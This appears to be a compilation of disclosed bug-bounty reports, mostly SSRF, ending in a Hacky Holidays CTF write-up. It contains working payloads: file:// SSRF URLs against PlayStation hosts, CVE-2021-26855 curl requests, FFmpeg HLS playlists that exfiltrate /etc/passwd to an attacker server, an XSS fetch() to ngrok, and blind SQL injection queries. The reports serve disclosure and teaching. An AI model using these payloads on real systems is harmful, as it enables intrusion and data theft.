https://store.mgmt.playstation.com/store/api/chihiro/00_09_000/container/US/en/999/UP4134-CUSA00329_00-ONNTGAME00000001/1429722215000/image?_version=00_09_000&platform=chihiro&w=225&h=225&bg_color=000000&opacity=100  

This will give you a 403.

**Using SSRF to open this URL:** https://image.api.np.km.playstation.net/images/?format=png&image=https%3a//store.mgmt.playstation.com/store/api/chihiro/00_09_000/container/US/en/999/UP4134-CUSA00329_00-ONNTGAME00000001/1429722215000/image%3f_version%3d00_09_000%26platform%3dchihiro%26w%3d225%26h%3d225%26bg_color%3d000000%26opacity%3d100

##Taking it further and finding another SSRF to extract internal images using `file` protocol.

We found an internal host of PSN which serves remote images with our given text (PhantomJs) on the further analysis we found this service could make use of `file` protocol as well and hence we could extract internal images as PoC. 

Host :  https://dis.api.np.playstation.net/dis/v1/banners?backplate=https://homer.dl.playstation.net/pr/bam-art/272/352/44592b67-85ac-41d6-b310-334363c5ea58.jpg&dimensions=790x250&price=$36.99&price_discount=$24.41&format[]=PS4&type=Full Game&locale=en_CA&cta=Download Now!&output=png&tpl=banner-web-store&store=game&region=us&

Opening the above URL will result in a timeout.

We use our SSRF to hit on this host and abuse the other SSRF to read internal files/images.

https://image.api.np.km.playstation.net/dis/images/?format=png&image=https%3A%2F%2Fdis.api.np.playstation.net%2Fdis%2Fv1%2Fbanners%3Fbackplate%3Dfile:////usr/share/pixmaps/system-logo-white.png%26dimensions%3D790x250%26price%3D%2436.99%26price_discount%3D%2424.41%26format%5B%5D%3DPS4%26type%3DF%22%3e%3c%73%3eull+Game%26locale%3Den_CA%26cta%3DDownload+No%26output%3Dsvg%26tpl%3Dbanner-web-store%26store%3Dgame%26region%3Dus%26


**Flow is:**

image.api.np.km.playstation.net -> dis.api.np.playstation.net -> fetches the local image using `file://`-> adds given data on image -> image served on (dis.api.np.playstation.net) -> images served to us (using image.api.np.km.playstation.net)

##Steps to reproduce:

- Open https://image.api.np.km.playstation.net/dis/images/?format=png&image=https%3A%2F%2Fdis.api.np.playstation.net%2Fdis%2Fv1%2Fbanners%3Fbackplate%3Dfile:////usr/share/pixmaps/system-logo-white.png%26dimensions%3D790x250%26price%3D%2436.99%26price_discount%3D%2424.41%26format%5B%5D%3DPS4%26type%3DF%22%3e%3c%73%3eull+Game%26locale%3Den_CA%26cta%3DDownload+No%26output%3Dsvg%26tpl%3Dbanner-web-store%26store%3Dgame%26region%3Dus%26

To open `file:////usr/share/pixmaps/system-logo-white.png` on `dis.api.np.playstation.net` host using `image.api.np.km.playstation.net`.   


## Impact

SSRF to local images read using `file:///`.

---

### [Server Side Request Forgery](https://hackerone.com/reports/644238)

- **Report ID:** `644238`
- **Severity:** Critical
- **Weakness:** Server-Side Request Forgery (SSRF)
- **Program:** Lark Technologies
- **Reporter:** @jin0ne
- **Bounty:** - usd
- **Disclosed:** 2021-03-29T05:36:49.139Z
- **CVE(s):** -

**Summary (team):**

A SSRF (server side request forgery) vulnerability was found in the chat feature of Lark Suite on MacOS, which could have potentially been used to access services and web applications running on the internal network. We thank @jin0ne for reporting this to our team and confirming the resolution.

**Summary (researcher):**

Details
https://jinone.github.io/bugbounty-a-simple-ssrf/

---

### [CVE-2021-26855 on ████████ resulting in SSRF](https://hackerone.com/reports/1119228)

- **Report ID:** `1119228`
- **Severity:** Critical
- **Weakness:** Server-Side Request Forgery (SSRF)
- **Program:** U.S. Dept Of Defense
- **Reporter:** @spongebhav
- **Bounty:** - usd
- **Disclosed:** 2021-03-24T20:54:28.248Z
- **CVE(s):** CVE-2021-26855

**Vulnerability Information:**

**Description:**
***CVE-2021-26855*** exists on ***███████ resulting*** in SSRF

## References

https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-26855
https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2021-26855

## Impact

Server Side Request Frogery

## System Host(s)
███████

## Affected Product(s) and Version(s)


## CVE Numbers
CVE-2021-26855

## Steps to Reproduce
```
curl -i -s -k -X $'GET' \
    -H $'Host: █████' -H $'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 11.1; rv:86.0) Gecko/20100101 Firefox/86.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Connection: close' -H $'Upgrade-Insecure-Requests: 1' \
    -b $'X-AnonResource=true; X-AnonResource-Backend=burpcollaborator.net/ecp/default.flt?~3; X-BEResource=localhost/owa/auth/logon.aspx?~3' \
    $'https://████████/owa/auth/x.js'
```

OUTPUT:
██████████

## Suggested Mitigation/Remediation Actions

---

### [SSRF due to CVE-2021-26855 on ████████](https://hackerone.com/reports/1119224)

- **Report ID:** `1119224`
- **Severity:** Critical
- **Weakness:** Server-Side Request Forgery (SSRF)
- **Program:** U.S. Dept Of Defense
- **Reporter:** @spongebhav
- **Bounty:** - usd
- **Disclosed:** 2021-03-24T20:53:21.655Z
- **CVE(s):** CVE-2021-26855

**Vulnerability Information:**

**Description:**
There exists a Server Side Request Frogery (SSRF) on ***█████████*** due to ***CVE-2021-26855***

## References
https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-26855
https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2021-26855

## Impact

Server Side Request Frogery

## System Host(s)
██████

## Affected Product(s) and Version(s)


## CVE Numbers
CVE-2021-26855

## Steps to Reproduce
```
curl -i -s -k -X $'GET' \
    -H $'Host: ████' -H $'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 11.1; rv:86.0) Gecko/20100101 Firefox/86.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Connection: close' -H $'Upgrade-Insecure-Requests: 1' \
    -b $'X-AnonResource=true; X-AnonResource-Backend=burpcollaborator.net/ecp/default.flt?~3; X-BEResource=localhost/owa/auth/logon.aspx?~3' \
    $'https://███/owa/auth/x.js'
```

Output:
█████████

## Suggested Mitigation/Remediation Actions

---

### [[usuppliers.uber.com] - Server Side Request Forgery via XXE OOB](https://hackerone.com/reports/448598)

- **Report ID:** `448598`
- **Severity:** High
- **Weakness:** Server-Side Request Forgery (SSRF)
- **Program:** Uber
- **Reporter:** @0xd0m7
- **Bounty:** - usd
- **Disclosed:** 2021-02-25T22:10:16.101Z
- **CVE(s):** CVE-2016-0457

**Summary (team):**

It was possible to determine open internal ports on an usuppliers.uber.com server, via examination of different error messages to a specific POST request made with various payloads.
This error message discrepancy would allow an attacker to discover open internal ports, potentially allowing more targeted future attacks against likely services running on these ports.

---

### [External SSRF and Local File Read via video upload due to vulnerable FFmpeg HLS processing](https://hackerone.com/reports/1062888)

- **Report ID:** `1062888`
- **Severity:** High
- **Weakness:** Server-Side Request Forgery (SSRF)
- **Program:** TikTok
- **Reporter:** @ach
- **Bounty:** 2727 usd
- **Disclosed:** 2021-02-15T20:16:56.169Z
- **CVE(s):** -

**Summary (team):**

A local file disclosure vulnerability was found which an attacker could have used to upload a payload file via the TikTok website and potentially exfiltrate arbitrary local system files. We thank @ach for reporting this to our team and confirming the resolution.

**Summary (researcher):**

# Summary:
FFmpeg is a free and open-source software project consisting of a large suite of libraries and programs for handling video, audio, and other multimedia files and streams. At its core is the FFmpeg program itself, designed for command-line-based processing of video and audio files. It is widely used for format transcoding, basic editing (trimming and concatenation), video scaling, video post-production effects and standards compliance (SMPTE, ITU).

FFmpeg includes libavcodec, an audio/video codec library used by many commercial and free software products, libavformat (Lavf), an audio/video container mux and demux library, and the core ffmpeg command-line program for transcoding multimedia files.

The SSRF-LFR in FFmpeg is pretty well known and old vulnerability but luckily I was able to find and exploit it in `https://www.tiktok.com/upload/` functionality.

At first I couldn't exploit LFR and only got SSRF to my collaborator server.
After some digging I found out that the problem was that my text editor added new line(\r\n) at the end of `header.m3u8` file.

Also this vulnerability leads to DOS but I decided not to test this issue.

# Exploitation:

## SSRF
For SSRF you just need to upload `.avi` file with injected HLS-directives inside.
**Example:**
```
#EXTM3U
#EXT-X-MEDIA-SEQUENCE:0
#EXTINF:10.0,
http://yourserver.com/anything
#EXT-X-ENDLIST
```

After that you will get a callback to your server. The user-agent will have Lavf(libavformat) version.

## LFR
In order to exploit LFR you need to host special file on your server and refer to it inside the video you wanna upload.

**Example:**
`header.m3u8` file you need to host at your server:
```
#EXTM3U
#EXT-X-MEDIA-SEQUENCE:0
#EXTINF:,
http://yourserver.com?
```
**Make sure that your `header.m3u8` doesn't have anything after `3f` byte(`?` sign). You can check that with `hexdump -C header.m3u8`**

`video.avi`
You need to inject these commands inside `video.avi` file:
```
#EXTM3U
#EXT-X-MEDIA-SEQUENCE:0
#EXTINF:10.0,
concat:http://yourserver.com/header.m3u8|file:///etc/passwd
#EXT-X-ENDLIST
```

After uploading `video.avi` you will receive **only first line** of `/etc/passwd` file.

But we need more, right?

To exfiltrate the whole file(any file). We can use two techniques. 

1. using `header.y4m`(you can find it in referenced links):
```
YUV4MPEG2 W30 H30 F25:1 Ip A0:0 Cmono
FRAME
```
This didn't work for me.

### Subfile technique

In order to exfiltrate the whole file line by line you can use this directives:
```
#EXTM3U
#EXT-X-MEDIA-SEQUENCE:0
#EXTINF:10.0,
concat:http://yourserver.com/header.m3u8|subfile,,start,1,end,10000,,:/etc/passwd
#EXT-X-ENDLIST
```
`start` parameter and it's value(1) means that we start from first symbol of the file and the `end` parameter symbolises the end of the line. There is no need to know exact `end` value. After getting first line you can easily calculate the `start` value of second line and so on.
For example for the second line our command wiil be something like:
`concat:http://yourserver.com/header.m3u8|subfile,,start,70,end,10000,,:/etc/passwd`


In some cases you can extract the whole file with this directive inside you video file:

```
#EXTM3U
#EXT-X-MEDIA-SEQUENCE:0
#EXTINF:1.0
/anything.txt
#EXTINF:1.0
file:///etc/passwd
#EXT-X-ENDLIST
```
You could see the whole `/etc/passwd` as video preview.
But in our case the vulnerable software worked while our video got converted on the server side.

All of the examples of video files and files with directives you can find in referenced links and by just googling it.

# References
* https://2017.zeronights.org/wp-content/uploads/materials/ZN17_yngwie_ffmpeg.pdf
* https://www.blackhat.com/docs/us-16/materials/us-16-Ermishkin-Viral-Video-Exploiting-Ssrf-In-Video-Converters.pdf
* https://docs.google.com/presentation/d/1yqWy_aE3dQNXAhW8kxMxRqtP7qMHaIfMzUDpEqFneos/edit
* https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/CVE%20Ffmpeg%20HLS

---

### [Stored XSS & SSRF in Lark Docs](https://hackerone.com/reports/892049)

- **Report ID:** `892049`
- **Severity:** Critical
- **Weakness:** Server-Side Request Forgery (SSRF)
- **Program:** Lark Technologies
- **Reporter:** @mike12
- **Bounty:** 3000 usd
- **Disclosed:** 2021-02-05T19:03:26.800Z
- **CVE(s):** -

**Summary (team):**

A stored XSS (cross site scripting) vulnerability was discovered in Lark Docs that could be escalated into a Server Side Request Forgery (SSRF) vulnerability if opened in a headless browser on the Lark server. The vulnerability has been resolved. We thank @mike12 for reporting this to our team and confirming the resolution.

---

### [SSRF in login page using fetch API exposes victims IP address to attacker controled server](https://hackerone.com/reports/996273)

- **Report ID:** `996273`
- **Severity:** High
- **Weakness:** Server-Side Request Forgery (SSRF)
- **Program:** U.S. Dept Of Defense
- **Reporter:** @iamrose
- **Bounty:** - usd
- **Disclosed:** 2021-01-12T21:41:19.842Z
- **CVE(s):** -

**Vulnerability Information:**

Note:      This is similar to my last report #991163. 


**Summary:**
 Server Side Request Forgery Exposes Victims Ip Address to External Server and which made attacker possible to determine physical location of Victim with IP Tracing.
**Description:**
Server Side Request Forgery is the critical vulnerability occurring in web application where attacker can perform malicious action on behalf of server. SSRF can lead to port scanning, cross domain hijacking, pivoting , extracting system files and many more. In this case, I use ngrok to generate our custom domain to prove occurrence of SSRF. Once I have custom ngrok domain i can analyze all request that are coming to the domain.
I used fetch() API property of JS to perform cross domain request and perform Server Side Request Forgery.
 

## Step-by-step Reproduction Instructions
1. Open the URL https://www.█████████
2. Open your ngrok instance and copy your listener domain it
3. SSRF payload  '><script>fetch('your ngrok instance')</script>
4. Append payload to source parameter
5. Final Crafted URL████&source='><script>fetch('your ngrok instance')</script>&server=submit.moboard.com&display=Please+log+on&title=%3C
6. Open 127.0.0.1:4040 in browser to analyze all incoming request
7. Open URL of Step 5 from any other device than the device ngrok is running 
8.  The request from US navy hits our ngrok client in 127.0.0.1:4040
9. The request contain ip address of victim who opened the URL, browser info, Operating System and many more.
10. We can trace victim location with ~$curl ipinfo.io/IP-address-of-victim

Screenshot is attached below with the request from navy server that hit my ngrok client


## Product, Version, and Configuration (If applicable)
Browser: Firefox 80.0.1 64 Bit
## Suggested Mitigation/Remediation Actions

## Impact

Server Side Request Forgery Exposes Victims Ip Address to External Server and which made attacker possible to determine physical location of Victim with IP Tracing. Also, attacker can launch port scans, launch exploits to whoever visits the US NAVY Website.

---

### [Hacky Holidays CTF Writeup](https://hackerone.com/reports/1066801)

- **Report ID:** `1066801`
- **Severity:** Critical
- **Weakness:** Server-Side Request Forgery (SSRF)
- **Program:** h1-ctf
- **Reporter:** @rykkard
- **Bounty:** - usd
- **Disclosed:** 2021-01-11T23:22:30.101Z
- **CVE(s):** -

**Vulnerability Information:**

Greetings team
Yay! Finally I made it to the end, thank you very much for launching this fantastic event, I had to review topics that I thought I knew, learned a lot and I am sure that I will continue learning with the community :)

{F1130889}

Hacky Holidays!
P.S. I will put my writeup in my next comment.

## Impact

---

---

### [Infiltrating into Grinch-Networks and saving Christmas!](https://hackerone.com/reports/1069141)

- **Report ID:** `1069141`
- **Severity:** Critical
- **Weakness:** Server-Side Request Forgery (SSRF)
- **Program:** h1-ctf
- **Reporter:** @castilho
- **Bounty:** - usd
- **Disclosed:** 2021-01-11T22:19:20.920Z
- **CVE(s):** -

**Summary (team):**

#

**Summary (researcher):**

Hi, you can find the write-up for this CTF here : https://castilho101.github.io/posts/hackerone-ctf-christmas

---

### [[ Hacky Holidays CTF ] Completely taken down the Grinch Networks](https://hackerone.com/reports/1066914)

- **Report ID:** `1066914`
- **Severity:** Critical
- **Weakness:** Server-Side Request Forgery (SSRF)
- **Program:** h1-ctf
- **Reporter:** @ht0x0
- **Bounty:** - usd
- **Disclosed:** 2021-01-11T21:32:20.523Z
- **CVE(s):** -

**Vulnerability Information:**

**Day 1 - Robot flag**

We're presented with sample ui page without any function. So I guessed content discovery is the best way to find flag.

And robots.txt came to my mind and found the flag.

>>https://hackyholidays.h1ctf.com/robots.txt

Response
```
User-agent: *
Disallow: /s3cr3t-ar3a
Flag: flag{48104912-28b0-494a-9995-a203d1e261e7}
```

>>Flag 1-:  flag{48104912-28b0-494a-9995-a203d1e261e7}==

**Day 2 - s3cr3t-ar3a**

You may noticed that we saw strange text in robots.txt

   Disallow: /s3cr3t-ar3a

When I tried to access this page, it look like the removed page but checked the source with Inspect Element and found the flag

```
<div class="alert alert-danger text-center" id="alertbox" data-info="flag{b7ebcb75-9100-4f91-8454-cfb9574459f7}" next-page="/apps">
<p>I've moved this page to keep people out!</p>
<p>If you're allowed access you'll know where to look for the proper page!</p>
</div>
```
>>Flag 2-: flag{b7ebcb75-9100-4f91-8454-cfb9574459f7}

**Day 3 - Grinch People Rater**

>>https://hackyholidays.h1ctf.com/people-rater

Day 3 challenge starts with a little fancy thing but nothing much yet .

There are 16 people names in page and by clicking any name makes a GET request along with their base64 decoded user id to retrieve information.

I checked the first one "Tea Avery"  and his/her id was 2.

eyJpZCI6Mn0 = {"id":2}

Basically his/her id probably should be 1 but it wasn't, so who is User {"id":1} ?

I encoded {"id":1} to base64 and make a request to see what happens and of course, it was the Grinch and retrieved flag along with his information.

{F1131249}

>>Flag 3 -:  flag{b705fb11-fb55-442f-847f-0931be82ed9a}

**Day 4 - Grinch Swag Shop**

>>https://hackyholidays.h1ctf.com/swag-shop

Simple swag shop but when we tried to purchase some item, Login page was appeared.

Neither we don't have any provided credentials nor account register page, we may find a way to get access as authenticated user.

After collecting some endpoints, I got the following list
```
/swag-shop/api/purchase
/swag-shop/checkout/
/swag-shop/api/login
```

As per my experience, I looked for /swag-shop/api/user and got the following response
```
HTTP/1.1 400 Bad Request
Server: nginx/1.18.0 (Ubuntu)
....
{"error":"Missing required fields"}
```

Interesting but not that much useful, then I run [Arjun](https://github.com/s0md3v/Arjun) through this api endpoint and found a valid parameter "**uuid**".

{F1131256}

We needed to find valid  **"uuid"**  value and I wasn't able to get it. So I fuzzed using [ffuf](https://github.com/ffuf/ffuf) and got  the following api endpoint leaking some user session.

>>https://hackyholidays.h1ctf.com/swag-shop/api/sessions

{F1131258}

 I decoded all sessions value and one of these sessions contained valid uuid parameter value.

{"user":"C7DCCE-0E0DAB-B20226-FC92EA-1B9043","cookie":"MWQ5OWFkNWE2MjIyZmZjMzZjMDQ3ODk5ZmI4ZjZjOWU0OGJhMjIwNmVkMTY="}

Now all we have to do is just append the uuid value in above user api endpoint and get the flag.

{F1131250}

>>Flag 4 -: flag{972e7072-b1b6-4bf7-b825-a912d3fd38d6}

**Day 5 - Secure Login**

>>https://hackyholidays.h1ctf.com/secure-login

As it said, we just need to login to get flag.
Putting random default credentials resulted "Invalid Username".It look like we need to brute force to get valid username first.
After running Burp Intruder a while with rockyou.txt , got a valid username "access".
Repeat same process for password and found "computer" as valid password.

Logged in and we see the error "No Files To Download", and the cookie parameter is interesting 

securelogin:"eyJjb29raWUiOiIxYjVlNWYyYzlkNThhMzBhZjRlMTZhNzFhNDVkMDE3MiIsImFkbWluIjpmYWxzZX0="

Decoding the value got the following text.

{"cookie":"1b5e5f2c9d58a30af4e16a71a45d0172","admin":false}

Change parameter admin to "true"  and we're provided with encrypted zip file.

{F1131260}

Now simply run the fcrackzip in order to crack zip file and found the password  " hahahaha".

>>fcrackzip -u -D -p rockyou-75.txt my_secure_files_not_for_you.zip

{F1131262}

Unzip the file and got the flag!!

>>Flag 5 -: flag{2e6f9bf8-fdbd-483b-8c18-bdf371b2b004}

**Day 6 - My-diary**

>>https://hackyholidays.h1ctf.com/my-diary/?template=entries.html

As you could see, the first thing came to my mind is LFI but failed to read local file like /etc/passwd so I tried to read default thing like index.php.

And now we can see the source code
```
<?php
if( isset($_GET["template"])  ){
    $page = $_GET["template"];
    //remove non allowed characters
    $page = preg_replace('/([^a-zA-Z0-9.])/','',$page);
    //protect admin.php from being read
    $page = str_replace("admin.php","",$page);
    //I've changed the admin file to secretadmin.php for more security!
    $page = str_replace("secretadmin.php","",$page);
    //check file exists
    if( file_exists($page) ){
       echo file_get_contents($page);
    }else{
        //redirect to home
        header("Location: /my-diary/?template=entries.html");
        exit();
    }
}else{
    //redirect to home
    header("Location: /my-diary/?template=entries.html");
    exit();
}
```
>>$page = preg_replace('/([^a-zA-Z0-9.])/','',$page);

The first preg_replace() function does to prevent from reading local file so we might skip this part.

    //protect admin.php from being read
    $page = str_replace("admin.php","",$page);

As it said, the above str_replace() function protect from being read "admin.php" but we can simply bypass this by tricking like

>>?template=admadmin.phpin.php

{F1131259}

but  our flag is in "secretadmin.php" so we can simply use to bypass the same way above using the payload

>>https://hackyholidays.h1ctf.com/my-diary/?template=secretadsecretadminadmin.php.phpmin.php

And we got the flag!!

{F1131252}

>>Flag 6 -: flag{18b130a7-3a79-4c70-b73b-7f23fa95d395}

**Day 7 - Hate Mail Generator**

https://hackyholidays.h1ctf.com/hate-mail-generator

By looking sample campaign, I got know that we can use template to create campaign but generating new campaign causing error but we can use preview.

```
POST /hate-mail-generator/new/preview HTTP/1.1
Host: hackyholidays.h1ctf.com
......
preview_markup=Hello,{{name}}&preview_data={"name":"Alice","email":"alice@test.com"}
```
And we got the response

```
Hello, Alice
```
I tried normal template injection payload and didn't work then I noticed that we could use to render the .html file using {template:cbdj3_grinch_header.html}

At this time, I run dirsearch and found this template folder https://hackyholidays.h1ctf.com/hate-mail-generator/templates/

{F1131261}

As we can see, the 38dhs_admins_only_header.html file is interesting but it give response 403.But what if we can render this file using above
template markup.I tried to render this page like this 
```
POST /hate-mail-generator/new/preview HTTP/1.1
Host: hackyholidays.h1ctf.com
......
preview_markup=Hello,{{name}}&preview_data={"name":"{{template:38dhs_admins_only_header.html}}","email":"alice@test.com"}
```
And we got the flag straightforward

{F1131247}

>>Flag 7 -: flag{5bee8cf2-acf2-4a08-a35f-b48d5e979fdd}

Day 8 - Grinch Forum

https://hackyholidays.h1ctf.com/forum

It's simple , we just need to login to get the flag but how?

I tried different ways to login like brute forcing username/password, sqli, but nothing worked.
Also found the phpmyadmin login page but couldn't able to login

Then I had no idea , just search "Grinch Networks" in google and found interesting [repo](https://github.com/Grinch-Networks/forum) created by challenge author in his profile.

After looking for a while, I thought he just leaked this repo by mistake but i just noticed there are some commits in repo.

> https://github.com/Grinch-Networks/forum/commit/efb92ef3f561a957caad68fca2d6f8466c4d04ae

```
 static public function read(){
        if( gettype(self::$read) == 'string' ) {
            self::$read = new DbConnect( false, 'forum', 'forum','6HgeAZ0qC9T6CQIqJpD' );
            self::$read = new DbConnect( false, '', '','' );
        }
        return self::$read;
    }
@@ -146,7 +146,7 @@ public static function closeAll(){
     */
    static public function write(){
        if( gettype(self::$write) == 'string' ) {
            self::$write = new DbConnect( true,  'forum', 'forum','6HgeAZ0qC9T6CQIqJpD' );
            self::$write = new DbConnect( true,  '', '','' );
        }
        return self::$write;
    }
```
By comparing with new code, he just removed these credentials from repo.So I was able to login phpmyadmin using this info and found Admin login username and password.
```
id 	username 	password 	                                                                 admin
1 	grinch 	35D652126CA1706B59DB02C93E0C9FBF 	1
2 	max 	388E015BC43980947FCE0E5DB16481D1
```
Simply cracked the grinch password and we logged into admin panel and found the flag

{F1131248}

>>Flag 8 -: flag{677db3a0-f9e9-4e7e-9ad7-a9f23e47db8b}

**Day 9 - Evil Quiz**

Firstly, when we try to simple name and submit quiz answers
```
POST /evil-quiz/ HTTP/1.1
Host: hackyholidays.h1ctf.com
.....
Cookie: session=7d63eaccc80ec7b6553c0b19ec10e4d0
....
name=lol
```

Got the response in https://hackyholidays.h1ctf.com/evil-quiz/score endpoint saying

"***There is 1 other player(s) with the same name as you!***"

But adding ' at the end of name got the response "***There is 0 other player(s) with the same name as you!***"

and I believed "name" parameter is vulnerable to second order sql  injection. 

now we need to fix the query to confirm the sql injection
Adding   --        as comment  didn't work
Adding   --+-   as comment didn't work
Adding    #          as comment worked

So I confirmed this parameter is probably vulnerable to second order sql  injection. For further exploitation,I run sqlmap but didn't success. ( may be I missed something with sqlmap )

Then I decided to do manual injection with boolean based as I was lazy to automate by writing own script .

Getting table
```
Request

name = lol'+or+Ascii(substring((Select+concat(table_name)from+information_schema.tables+where+table_schema=database()+limit+0,1),1,1))<100#

Response

There is 769468 other player(s) with the same name as you!
```
It means **TRUE** that the ASCII value of table_name's first character is less than 100 and we need to specify more
```
Request

name=lol'+or+Ascii(substring((Select+concat(table_name)from+information_schema.tables+where+table_schema=database()+limit+0,1),1,1))<90#

Response

There is 0 other player(s) with the same name as you!
```

It means **FALSE** that the ASCII value of table_name's first character isn't less than 90 so we can confirm the first character is between 90-100.

By trying each number, we found the valid one.

```
name=lol'+or+Ascii(substring((Select+concat(table_name)from+information_schema.tables+where+table_schema=database()+limit+0,1),1,1))=97#

TRUE
```
97 is the value of  [ASCII](https://www.ascii-code.com/) character "a" so we know that the first character of table name is "a".

we can get the next letter by incrementing the 1, to a 2, in our substring() statement.

```
name = lol'+or+Ascii(substring((Select+concat(table_name)from+information_schema.tables+where+table_schema=database()+limit+0,1),2,1))>90#

TRUE

name = lol'+or+Ascii(substring((Select+concat(table_name)from+information_schema.tables+where+table_schema=database()+limit+0,1),2,1))<100#

FALSE

name = lol'+or+Ascii(substring((Select+concat(table_name)from+information_schema.tables+where+table_schema=database()+limit+0,1),2,1))=100#

TRUE
```
Converting 100 to ASCII character we got "d" . so  probably the table_name is "admin".
Now let's get the columns with the following query.
```
name =lol'+or+Ascii(substring((Select+concat(column_name)+from+information_schema.columns+where+table_name=0x61646d696e+limit+0,1),1,1))>0#
```
Keep doing the same way as above, so far we have the valid columns "username" and "passsword"

Getting username
```
name = lol'+or+Ascii(substring((Select+concat(username)+from+admin+limit+0,1),1,1))>0#
```
Getting password
```
name = lol'+or+Ascii(substring((Select+concat(password)+from+admin+limit+0,1),1,1))>0#
```
Now we have the username and password to login [admin panel](https://hackyholidays.h1ctf.com/evil-quiz/admin)
username = admin  
password = S3creT_p4ssw0rd-$

Upon logging with above credentials, we can see the flag finally.

{F1131251}

PS. Actually this challenge took me 5-6 hours to get the final flag because the server takes too long to response to the request.

>>Flag 9 -: flag{6e8a2df4-5b14-400f-a85a-08a260b59135}

**Day 10  - SignUp Manager**

https://hackyholidays.h1ctf.com/signup-manager/

At first sight, we're provided with simple SignUp and Login page.

By checking source code, found the comment 

<!-- See README.md for assistance -->

Upon looking for README.md , we know file zip file path which might be included source codes.

>>https://hackyholidays.h1ctf.com/signup-manager/signupmanager.zip

***Analyzing the source code***

After reviewing multiples php files, index.php look interesting.

Let's take a look at Signup function
```
<?php
        if ($_POST["action"] == 'signup' && isset($_POST["username"], $_POST["password"], $_POST["age"], $_POST["firstname"], $_POST["lastname"])) {
            $username = substr(preg_replace('/([^a-zA-Z0-9])/', '', $_POST["username"]), 0, 15);
            if (strlen($username) < 3) {
                $errors[] = 'Username must by at least 3 characters';
            } else {
                if (isset($all_users[$username])) {
                    $errors[] = 'Username already exists';
                }
            }
            $password = md5($_POST["password"]);
            $firstname = substr(preg_replace('/([^a-zA-Z0-9])/', '', $_POST["firstname"]), 0, 15);
            if (strlen($firstname) < 3) {
                $errors[] = 'First name must by at least 3 characters';
            }
            $lastname = substr(preg_replace('/([^a-zA-Z0-9])/', '', $_POST["lastname"]), 0, 15);
            if (strlen($lastname) < 3) {
                $errors[] = 'Last name must by at least 3 characters';
            }
            if (!is_numeric($_POST["age"])) {
                $errors[] = 'Age entered is invalid';
            }
            if (strlen($_POST["age"]) > 3) {
                $errors[] = 'Age entered is too long';
            }
            $age = intval($_POST["age"]);
            if (count($errors) === 0) {
                $cookie = addUser($username, $password, $age, $firstname, $lastname);
                setcookie('token', $cookie, time() + 3600);
                header("Location: " . explode("?", $_SERVER["REQUEST_URI"])[0]);
                exit();
            }
        }
?>
```
As far as we saw, Signup function straightforward expect the character limit for various input. OK , now let's jump into AddUser() function
```
<?php
function addUser($username,$password,$age,$firstname,$lastname){
    $random_hash = md5( print_r($_SERVER,true).print_r($_POST,true).date("U").microtime().rand() );
    $line = '';
    $line .= str_pad( $username,15,"#");
    $line .= $password;
    $line .= $random_hash;
    $line .= str_pad( $age,3,"#");
    $line .= str_pad( $firstname,15,"#");
    $line .= str_pad( $lastname,15,"#");
    $line .= 'N';
    $line = substr($line,0,113);
    file_put_contents('users.txt',$line.PHP_EOL, FILE_APPEND);
    return $random_hash;
?>
```
It simply takes our input and 

> fill up to 15 characters
> append these all in one line using ".=" operator
> put all conetnt in users.txt
> return random_hash to set user session.

Now take a look at, builduser() function
```
<?php
function buildUsers(){
    $users = array();
    $users_txt = file_get_contents('users.txt');
    foreach( explode(PHP_EOL,$users_txt) as $user_str ){
        if( strlen($user_str) == 113 ) {
            $username = str_replace('#', '', substr($user_str, 0, 15));
            $users[$username] = array(
                'username' => $username,
                'password' => str_replace('#', '', substr($user_str, 15, 32)),
                'cookie' => str_replace('#', '', substr($user_str, 47, 32)),
                'age' => intval(str_replace('#', '', substr($user_str, 79, 3))),
                'firstname' => str_replace('#', '', substr($user_str, 82, 15)),
                'lastname' => str_replace('#', '', substr($user_str, 97, 15)),
                'admin' => ((substr($user_str, 112, 1) === 'Y') ? true : false)
            );
        }
    }
    return $users;
?>
```
The first line set the array which named $users and get user info from file content of users.txt.

Then get the each stored values using substr()  and removed "#" characters and save at $users arrray.

The last one is interesting that it compare the last character of our strings to "Y" 
> 'admin' => ((substr($user_str, 112, 1) === 'Y') ? true : false)

and if  it returns true, we got admin access by  following code.
```
<?php
$all_users = buildUsers();
$page = 'signup.php';
if( isset($_COOKIE["token"]) ){
    foreach( $all_users as $u ){
        if( $u["cookie"] === $_COOKIE["token"] ){
            if( $u["admin"] ){
                $page = 'admin.php';
            }else{
                $page = 'user.php';
            }
        }
    }
}
?>
```
But normally  it's not possible to make the last character "Y" because you might notice that  $line .= 'N'; append 'N' in the last of our info in user.txt.
So we need to find a way to push our input into last character to be "Y".

After looking hours for multiple function, 

> $age = intval($_POST["age"]);
 
This intval() function took my attention. We are allowed to set age number up to 3 characters and these number needed to be numeric.
```
<?php
if (!is_numeric($_POST["age"])) {
                $errors[] = 'Age entered is invalid';
            }
            if (strlen($_POST["age"]) > 3) {
                $errors[] = 'Age entered is too long';
            }
            $age = intval($_POST["age"]);
?>
```
I read the documentation abot intval() function and came to know that we can use this  scientific notation 'e' to get longer number  with 3 characters.
```
<?php
echo intval(1e3);                        //1000
echo intval(1e4);                       //10000
echo intval(1e5);                       // 100000 
echo intval(1e10);                    //  10000000000 
?>
```
Now, it's time to construct our final payload to get flag.when we set age number to "1e5" the server calculate the value and response with 100000.
So the final input payload become like this.

```
POST /signup-manager/ HTTP/1.1
Host: hackyholidays.h1ctf.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.16; rv:84.0) Gecko/20100101 Firefox/84.0
.....
.....

action=signup&username=LMAO&password=12345&age=1e5&firstname=XXXXXXXXXXXXXXX&lastname=YYYYYYYYYYYYYYY
```
Our last name field become the last character "Y" because the following code stripped the string if it was more than 113 characters.

>$line = substr($line,0,113);

And now when this function check the last character of our string it will return TRUE .

>'admin' => ((substr($user_str, 112, 1) === 'Y') ? true : false)

